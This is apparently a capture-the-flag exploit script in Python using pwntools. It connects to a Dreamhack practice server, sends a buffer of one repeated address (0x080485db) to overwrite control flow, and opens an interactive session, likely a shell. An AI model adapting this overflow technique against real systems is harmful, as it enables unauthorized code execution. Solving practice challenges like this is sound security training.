#!/usr/bin/python3

import pwn

pwn.context.log_level = 'debug'
p = pwn.remote("host1.dreamhack.games", 17382)

target = 0x080485db

payload = pwn.p32(target)*64

p.send(payload)
p.interactive()
